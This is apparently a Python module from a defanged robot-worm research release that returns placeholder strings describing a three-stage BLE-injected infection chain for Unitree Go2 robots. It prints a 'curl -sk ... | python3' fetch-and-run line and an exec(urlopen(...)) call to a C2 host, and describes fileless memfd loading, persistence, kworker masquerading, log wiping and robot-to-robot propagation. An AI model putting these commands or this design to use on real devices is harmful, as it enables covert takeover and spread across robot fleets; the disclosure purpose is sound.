"""
Payload builder for the three-stage infection chain (defanged).

The staged architecture is designed for constrained delivery channels:
BLE command injection has a ~200 byte payload limit, so the actual agent
must be fetched over the network in stages.

  Stage 0 (dropper, ~6 lines):
    Delivered via the BLE injection.  Registers the robot with C2,
    then downloads and execs Stage 1.  Minimal footprint - the entire
    script must fit in a shell injection payload.

  Stage 1 (downloader, ~15 lines):
    Downloaded and exec'd by Stage 0.  Fetches the memfd stub loader,
    writes it to disk, chmod +x, and launches it detached.  The stub
    uses memfd_create to load Stage 2 into memory (fileless execution).

  Stage 2 (worm agent, ~1500 lines):
    Self-contained stdlib-only Python script.  No pip dependencies -
    the production version included a pure-Python AES-128-CFB
    implementation so it could run on stock Go2 firmware.  Handles:
    beacon loop, task execution, persistence, opsec, propagation.

In this defanged release, all stages return descriptive placeholder
strings that document the real payload structure without providing
executable exploit code.
"""

from uniroam import config


def get_c2_base() -> str:
    return config.get_c2_url()


def build_stage0(c2_base: str | None = None,
                 parent_id: str = "PATIENT_ZERO_BLE") -> str:
    """Return a descriptive Stage 0 placeholder.

    The real Stage 0 was a ~6-line Python script that:
      1. Built a robot ID from hostname + MAC address
      2. POSTed a beacon to C2 (so the robot appeared in the dashboard)
      3. Fetched and exec'd Stage 1 from C2

    It used stdlib only (urllib.request, json, socket, ssl) and skipped
    TLS verification because the Go2's CA bundle is often outdated.
    """
    if c2_base is None:
        c2_base = get_c2_base()

    return f"""\
# === STAGE 0 - DROPPER (defanged placeholder) ===
#
# Delivery: curl -sk {c2_base}/s0 | python3
# Parent:   {parent_id}
#
# In the live framework, this script:
#   1. Derived a stable robot ID from hostname + /sys/class/net/wlan0/address
#   2. Sent an initial beacon to {c2_base}/api/v1/beacon with:
#      - robot_id, hostname, platform, parent_id
#      - event_type: "initial_compromise"
#   3. Downloaded Stage 1: exec(urlopen("{c2_base}/s1").read())
#
# Total size: ~500 bytes (must fit BLE injection payload limit)
print("[DEFANGED] Stage 0 dropper - no payload executed")
"""


def build_stage1(c2_base: str | None = None) -> str:
    """Return a descriptive Stage 1 placeholder.

    The real Stage 1:
      1. Downloaded the stub loader from GET /stub
      2. Killed any existing agent process
      3. Wrote the stub to WORM_INSTALL_PATH (/usr/local/bin/unitree-updater)
      4. chmod +x
      5. Launched it detached via subprocess.Popen(start_new_session=True)

    The stub loader (served at /stub) used memfd_create via ctypes to:
      1. Create an anonymous file descriptor (fd = memfd_create("", 0))
      2. Fetch Stage 2 from C2 and write it to the fd
      3. exec() the fd path (/proc/self/fd/<N>)

    This achieved fileless execution - Stage 2 ran from memory with no
    file on disk (though the stub itself was written to disk for persistence).
    """
    if c2_base is None:
        c2_base = get_c2_base()

    return f"""\
# === STAGE 1 - DOWNLOADER (defanged placeholder) ===
#
# In the live framework, this script:
#   1. Fetched the memfd stub loader from {c2_base}/stub
#   2. Wrote it to {config.WORM_INSTALL_PATH}
#   3. Launched it detached (start_new_session=True)
#   4. The stub used memfd_create() for fileless Stage 2 execution
#
print("[DEFANGED] Stage 1 downloader - no payload executed")
"""


def build_stage2(c2_base: str | None = None) -> str:
    """Return a descriptive Stage 2 placeholder.

    The real Stage 2 was a ~1500-line stdlib-only Python script
    (worm_payload.py) that ran as a persistent agent on the target.

    Key design decisions:
      - Zero external dependencies (no pip on target)
      - Pure-Python AES-128-CFB for BLE packet crypto (full S-box)
      - Pure-Python BLE via gatttool/hcitool subprocess calls
      - Configuration injected via string replacement at serve time
      - Demo mode flag to disable persistence/log-wipe for safe testing
      - Dead man's switch: auto-cleanup after 48h without C2 contact

    Capabilities:
      - Jittered beacon loop (60-300s, randomized)
      - Task execution (EXECUTE_CMD, COLLECT_INTEL, SELF_DESTRUCT,
        PROPAGATE_START, PROPAGATE_STOP, PROPAGATE_DDS, PROPAGATE_WEBRTC)
      - Persistence (systemd + cron + rc.local, blends into robot fs layout)
      - Process name masquerade (prctl PR_SET_NAME to look like kworker)
      - Log cleaning (bash_history, auth.log, syslog, journal)
      - BLE propagation via gatttool (robot-to-robot spread)
      - WebRTC bridge discovery (LAN port scan for signaling endpoints)
      - DDS multicast propagation via CycloneDDS (pre-installed on Go2)
    """
    if c2_base is None:
        c2_base = get_c2_base()

    return f"""\
# === STAGE 2 - WORM AGENT (defanged placeholder) ===
#
# The live agent was ~1500 lines of stdlib-only Python.
# See docs/ARCHITECTURE.md for the full design.
#
print("[DEFANGED] Stage 2 agent - no payload executed")
"""


class PayloadManager:
    """Manages payload generation for the C2 server."""

    def __init__(self, c2_base: str | None = None):
        self.c2_base = c2_base or get_c2_base()

    def stage0(self, parent_id: str = "PATIENT_ZERO_BLE") -> str:
        return build_stage0(self.c2_base, parent_id)

    def stage1(self) -> str:
        return build_stage1(self.c2_base)

    def stage2(self) -> str:
        return build_stage2(self.c2_base)
